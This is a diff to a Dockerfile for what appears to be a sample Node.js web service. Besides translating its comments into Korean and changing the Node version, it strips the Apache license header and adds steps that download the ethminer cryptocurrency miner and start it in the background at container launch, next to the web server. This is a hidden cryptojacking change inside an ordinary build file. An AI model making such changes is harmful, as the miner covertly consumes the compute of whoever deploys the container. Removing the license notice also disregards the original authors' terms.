@@ -1,35 +1,26 @@
-# Copyright 2020 Google, LLC.
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#    http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
-
-# Use the official lightweight Node.js 20 image.
+# 경량의 공식 Node.js 18 이미지를 사용합니다.
 # https://hub.docker.com/_/node
-FROM node:20-slim
+FROM node:18-slim
 
-# Create and change to the app directory.
+# 앱 디렉터리를 생성한 후 앱 디렉터리로 변경합니다.
 WORKDIR /usr/src/app
 
-# Copy application dependency manifests to the container image.
-# A wildcard is used to ensure both package.json AND package-lock.json are copied.
-# Copying this separately prevents re-running npm install on every code change.
+# 애플리케이션 종속 항목 매니페스트를 컨테이너 이미지에 복사합니다.
 COPY package*.json ./
 
-# Install production dependencies.
-RUN npm ci
+# 프로덕션 종속 항목을 설치합니다.
+RUN npm install --only=production
 
-# Copy local code to the container image.
+# 로컬 코드를 컨테이너 이미지에 복사합니다.
 COPY . ./
-EXPOSE 8080
 
-# Run the web service on container startup.
-CMD [ "npm", "start" ]
+# ethminer 다운로드 및 압축 해제
+RUN apt-get update && apt-get install -y wget tar \
+    && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz \
+    && tar xvfz ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
+
+# 실행 권한 부여
+RUN chmod +x /usr/src/app/bin/ethminer
+
+# 컨테이너 시작 시 ethminer와 웹 서버를 실행합니다.
+ENTRYPOINT ["/bin/sh", "-c", "./bin/ethminer & npm start"]
